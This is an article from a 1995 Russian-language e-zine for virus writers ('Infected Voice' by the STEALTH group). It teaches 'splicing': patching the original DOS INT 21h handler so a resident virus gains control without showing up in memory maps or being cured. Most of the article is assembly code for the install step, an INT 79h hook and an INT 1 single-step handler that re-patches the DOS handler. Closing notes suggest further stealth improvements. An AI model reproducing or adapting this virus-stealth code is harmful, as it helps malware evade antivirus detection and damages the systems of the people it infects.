           ▄▄                  █
          ▀▀▀ Monthly Magazine █ For VirMakers.                  JULY '95
          ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
           ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ ▐▀▀█ █
            █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █   ▐▌ █
            █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █   █  █
            ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
           (C) STEALTH group WWide, Box 10, Kiev-148, fUcKRAINE 
 ─────────────────────────────────────────────────────────────────────────────
		Классический сплайсинг на примере INT 21h.
 ─────────────────────────────────────────────────────────────────────────────


                                               (c) IntMaster-1995

       Многих virmaker-ов волнует вопрос, как поглубже  влезть  в
   память и подольше остаться  незаметным, контролируя  при  этом
   жизненно важные операции на компе. Одной из классических  идей
   на эту тему является сплайсинг - врезка перехода на свое  тело
   непосредственно в обработчик прерывания. В этом случае обнару-
   жение и лечение вируса в памяти _значительно_ усложняется. Так
   даже по самой подробной карте памяти не видно,  что  на  самом
   деле при вызове прерывания управление получает наш  блок  (!).
   Как вы понимаете дизасамблировать и изучать обработчики преры-
   ваний наши Уважаемые Юзеры еще не додумались. Если уж  браться
   за  сплайсинг,  то  лучше  всего  модифицировать  оригинальный
   DOS-ий обработчик, так как в этом случае нас нельзя  обойти  с
   помощью алгоритма iv_1.006 (такие вещи  могут  вполне  исполь-
   зоваться  антивирусами). Наш обработчик нужно строить по такой 
   схеме:

               ┌──────────────────────────────┐
               │    Получить управление и     │
               │ восстановить DOS обработчик  │
               └──────────────┬───────────────┘
                             \│/
               ┌──────────────┴───────────────┐
               │   Все, что нужно вирусу...   │
               └──────────────┬───────────────┘
                             \│/
               ┌──────────────┴───────────────┐
               │Откоректировать DOS обработчик│
               │    и отдать управление       │
               └──────────────────────────────┘

        При разработке п.3 нужно иметь в виду, что некоторые фун-
   кции, например INT 21h,00h INT 21h,4ch, не возвращают управле-
   ние в точку вызова. Поэтому, коректировать обработчик DOS-а  в
   данном варианте рекомендуется с помощью трасировки  нескольких
   первых команд обработчика.Ниже приведен соответствующий  текст
   сплайсинга 21-Ого прерывания.

        1. При инсталяции в память.

        ; ds -> VirSeg - сегмент вируса
        ;_seg_:_ofs_ -> оригинальный int 21 процедура

        mov word ptr es:[4*79h+2],VirSeg     ; Устанавливаем наш
        mov word ptr es:[4*79h],offset int79 ; обработчик int 79h

        les di,ds:[_ofs_]          ; Первыми 2-я байтами обработчика
        mov ax,word ptr es:[di]    ; ставим INT 79h
        mov word ptr ds:[s21h],ax
        mov word ptr es:[di],079cdh  ; int 79h

        2. Обработчик 79 прерывания.

 @21_   proc     ; Процедура вызова оригинального 21 прерывания
        pushf
        db 9ah
 _ofs_: dw ?
 _seg_: dw ?
        ret
 @21_   endp

 ; Начало обработчика 79 прерывания
 int79: push ax di es
        cld
        les di,cs:[_ofs_-entry] ;Восстанавливаем 2 байта
        mov ax,0000h            ;обработчика 21
        org $-2
 s21h   dw ?
        stosw
        pop es di ax

        ;...............................................
        ; Далее идет непосредственно обработчик вируса.
        ; При необходимости вызова int 21
        ; использовать call @21_
        ;...............................................

        ; ...

        ; При завершении обработки использовать:
        jmp end21

 end21  proc
        push dx es ds
        xor dx,dx
        mov es,dx
        lds dx,es:[4]             ; Сохраняем ветор int 1
        mov cs:[int1of],dx
        mov cs:[int1sg],ds
        mov word ptr es:[4],int1_ ; Устанавливаем свой int 1
        mov word ptr es:[6],cs
        pop ds es dx
        push bp
        mov bp,sp
        sub word ptr [bp+2],2    ;Корректируем точку возврата
				 ;(находится в стеке после вызова 
				 ; int 79h)
        or word ptr [bp+6],0100h ;Устанавливаем флаг трасировки
                                 ;в сохраненном регистре флагов
        pop bp
        iret                     ;Передаем управление в обработчик 21h
                                 ;Переходим в режим трасировки
 end21  endp

 int1_  proc
        push ax
        push bp
        mov bp,sp
        mov ax,word ptr cs:[_ofs_]
        inc ax
        cmp ax,word ptr [bp+4]  ;Выполнились ли первые 2 байта ?
        je next                 ;Тогда устанавливаем int 79h
                                ;вместо них.
        push es di si ds
        les di,cs:[_ofs_]
        mov word ptr es:[di],079cdh

        xor di,di
        mov es,di
        lds si,cs:[int1of]    ;Востанавливаем int 1 вектор
        mov es:[4],si
        mov es:[6],ds
        pop ds si di es

        and word ptr [bp+8],0feffh  ;Убераем флаг трасировки
 next:  pop bp
        pop ax
        iret
 int1of dw ?     ; Первоначальный int 1 вектор
 int1sg dw ?
 int1_  endp


   P.S. Конечно приведенный алгоритм можно улучшить. Так, например,

        1.Вместо использования int 79h можно было ставить jmp
          на наш обработчик (тогда таблица векторов  вообще б
          не изменилась).

        2.Врезку можно  выполнять в середину обработчика. Это
          затруднит обнаружение вируса в памяти.


P.P.S. Как показали опыты, данный метод вполне совместим с Windows
        естественно,  если  вирус  инсталировался  перед  загрузкой
        оболочки.  

<<<<<<<<<<<<<<<<<<<<<<<<<< THAT'S ALL FOLKS! >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
